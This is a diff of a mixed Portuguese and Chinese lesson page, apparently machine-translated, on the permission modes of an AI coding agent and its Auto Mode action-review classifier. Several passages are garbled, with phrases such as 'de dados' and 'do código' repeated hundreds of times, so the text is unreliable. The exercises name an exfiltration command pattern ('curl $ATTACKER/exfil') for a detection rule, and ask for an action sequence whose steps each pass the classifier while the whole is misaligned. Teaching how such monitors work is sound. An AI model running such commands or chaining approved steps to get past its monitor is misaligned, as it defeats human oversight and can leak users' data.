@@ -1,6 +1,6 @@
-# Como Agente Autônomo de Claude Código: Modulo de Autoridade e Modo Automático
+# Modelo de Autonomia do Agente
 
-> O código Claude  expôs 7 tipos de restrições. O "plano" só será executado em cada movimento, o "default" só será executado em cada movimento, o "accepteded" será automaticamente aprovado, mas ainda será executado em shell, o "bypasspermissions" será aprovado.`max_turns`和 `max_budget_usd`强制执行──Auto Mode 以研究预览 形式发布Anthropic 已明确表示,classifier 单独使用并不足──
+> 权限阶梯从动作逐步审查到批准一切的分级自主程度是利用 管控自主代理 无需询问就能做的方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能执行方式. 无需询问的模式. 无需询问的模式.`auto` O modelo de poder  utiliza um modelo de classificador independente  substituir por um movimento de aprovação: ele reúne o movimento em cada movimento, e impede qualquer aumento que exceda o alcance da solicitação `max_turns`和 `max_budget_usd`强制执行――`auto`Se a utilização é ou não dependente do plano, da organização ou não, do modelo e do fornecedor, antropico, já foi definido, o classificador, o uso individual não é suficiente.
 
 **类型：**- aprendizagem
 **语言：**Python(stdlib, dois estágios de classificador simulador)
@@ -11,32 +11,31 @@
 
 O agente de codificação autônoma em seu computador é uma categoria de segurança independente. O ataque é o agente capaz de acessar tudo o que é um sistema de arquivos, rede, credenciais, clipboard, qualquer guia de navegador, qualquer terminal aberto. Bruce Schneier, etc. já publicamente observou que os agentes de uso de computadores não são uma nova função de chatbots, mas uma nova ferramenta, com uma nova espécie de imagem.
 
-O sistema de direitos do código Claude é um sistema de controle de dados antropológico. Não é um sistema de controle de dados autônomo, mas sim um sistema de controle de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de dados de
+O sistema de direitos do código Claude é um sistema de controle que é dado por Antropic. Não é um sistema autónomo, mas sim uma capacidade de criar seis modelos: plano → padrão → aceitarEdits → ... → bypassPermissões. Cada modelo é feito entre a velocidade e a análise de cada movimento.
 
 O problema do engenharia é: o sistema consegue capturar o que vai perder, e qual modelo deve ser usado para uma determinada tarefa?
 
 ## 概念
 
-### 七种权限模式
+### 六种权限模式
 
 | 模式 | 行为 | 使用场景 |
 |---|---|---|
 | `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
-| `default` | Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
+| `default` | 在 UI 中标为 “Manual”。Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
 | `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
-| `acceptExec` | shell commands 在经过整理的 allowlist 内自动批准；写入自动批准 | 紧密 inner loops，其中每个 shell command 都是 `npm test` 或类似命令 |
-| `autoMode` | 两阶段 safety classifier；被标记的动作提升为审查 | 受限 workspace 中的 long-horizon unattended runs |
-| `yolo` | 跳过大多数提示；仍然运行 tool allowlist / denylist | 临时 sandboxes、CI jobs、research scripts |
+| `auto` | 由一个独立的 classifier model 在每个动作运行前审阅它；阻止任何超出请求范围的升级 | 受限 workspace 中的 long-horizon unattended runs |
+| `dontAsk` | 从不提示；未被 permission rules 预先批准的动作一律拒绝 | 临时 sandboxes、CI jobs、research scripts |
 | `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |
 
-(a título de "Yolo" é uma abreviação não oficial de "Primer Terreno Permissível").
+(Nome acima e código aberto do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do`default`标为 Manual。)
 
 ### Uma página compreender Modo Automático
 
 Auto Mode ([[2026]] 3 月 24 日发布) é a primeira forma de dar autorização a um modelo.
 
-1. **Stage 1 — single-token classifier。**Em cada movimento proposto, a execução é baixa, o custo é baixo, o retorno é "seguro" ou "flag" e o movimento não fica na fila.
-2. **Stage 2 — secondary policy/safety review。**Apenas em movimento marcado. Em torno da sessão, o estado atual e a declaração de tarefa de execução de políticas e avaliações de segurança focalizadas. Se a confiança for baixa, a atualização para HITL do usuário.
+1. **一个独立的 classifier model。**Em cada proposta de movimento antes de executar, revisá-lo, de acordo com a declaração de tarefa e sessão, o estado atual para julgar, e impedir qualquer aumento acima do alcance da solicitação.
+2. **受限的可用性。**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             `auto` depende do plano 、 organização ou não 、 modelo e fornecedor 、
 
  orçamento control e classificador não existem:
 
@@ -64,9 +63,8 @@ Antropic 将 Auto Mode 作为研究预览发布.文档明确说明,classifier is
 
 - tarefas desconhecidas:`plan`Começar... ler o plano é mais barato do que voltar a andar mal.
 - 已知 refactor:`acceptEdits`- Não, não.
-- execução de fundo não supervisionada: apenas quando já tiveres medido o raio da explosão`autoMode`Não há credenciais, não há montos de produção, não há saída de seleção de produção.
-- Containers efemerais: quando e apenas quando contêineres e suas credenciais são descartáveis,`yolo`- Não .`bypassPermissions`Não posso aceitar.
-
+- execução de fundo não supervisionada: apenas quando já tiveres medido o raio da explosão`auto`Não há credenciais, não há montos de produção, não há saída de seleção de produção.
+- Containers efemerais: quando e apenas quando contêineres e suas credenciais são descartáveis,`dontAsk`- Não .`bypassPermissions`Não posso aceitar.
 
 ```figure
 autonomy-oversight
@@ -74,7 +72,7 @@ autonomy-oversight
 
 ## Use-o
 
-`code/main.py`模拟两阶段分类器. É uma regra de palavras-chave baratas dirigida a projetadas. É uma regra de regras-chave mais lenta. É um motorista.
+`code/main.py`Colocar um classificador de revisão de ação 模拟成两阶段管道 é uma simplificação do ensino; real `auto`O modelo atrás é um modelo de classificador independente, e não um dos dois estágios de acordo com o documento. A primeira etapa é a regra de palavras-chave baratas de movimentos propostos; a segunda etapa é um revisor de regra múltipla mais lento.
 
 ## Entrega-o
 
@@ -86,23 +84,23 @@ autonomy-oversight
 
 2. 扩展 Fase 1 conjunto de regras, para capturar uma determinada forma conhecida-mau, por exemplo`curl $ATTACKER/exfil`)── em amostra de ação benigna 上测量 false-positive rate──
 
-3. 阅读 Anthropic's "Como funciona o ciclo do agente" 文档――列出 agent 在 `default`模式下默认触碰的每种外部状态──在无监督运行  运行   运行   运行 `autoMode`Antes, que precisa de um portão?
+3. 阅读 Anthropic's "Como funciona o ciclo do agente" 文档――列出 agent 在 `default`模式下默认触碰的每种外部状态──在无监督运行  运行   运行   运行 `auto`Antes, que precisa de um portão?
 
 4. 设计一个 24 小时 无监督运行预算:`max_turns`- Não.`max_budget_usd`、per-tool caps、allowlists──说明每个数字的理由──
 
-5. Descreva uma trajetória: cada uma delas foi aprovada na fase 1 e na fase 2, mas o comportamento de composição foi desalinhado.
+5. Descrever uma trajetória: cada um deles é classificado, mas o comportamento de montagem é desalinhado.
 
 ## 关键术语
 
 | 术语 | 人们常说 | 实际含义 |
 |---|---|---|
-| 权限模式 | “agent 能做多少事” | 控制逐动作批准的七种命名 policy 之一 |
+| 权限模式 | “agent 能做多少事” | 控制逐动作批准的六种命名 policy 之一 |
 | plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
 | acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
-| autoMode | “自动批准” | 两阶段 safety classifier；被标记的动作会升级 |
+| auto | “Auto approvals” | 独立的 classifier model 审阅每个动作；阻止超出请求范围的升级 |
 | bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
-| Stage 1 classifier | “Fast token check” | 针对拟议动作的 single-token rule；并行运行 |
-| Stage 2 classifier | “Deep review” | 对被标记动作进行 chain-of-thought reasoning |
+| Stage 1（simulator） | “Fast keyword check” | `code/main.py` 中针对拟议动作的廉价 rule |
+| Stage 2（simulator） | “Deep review” | `code/main.py` 中针对被标记动作的更慢 multi-rule reviewer |
 | Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |
 
 ## 延伸阅读
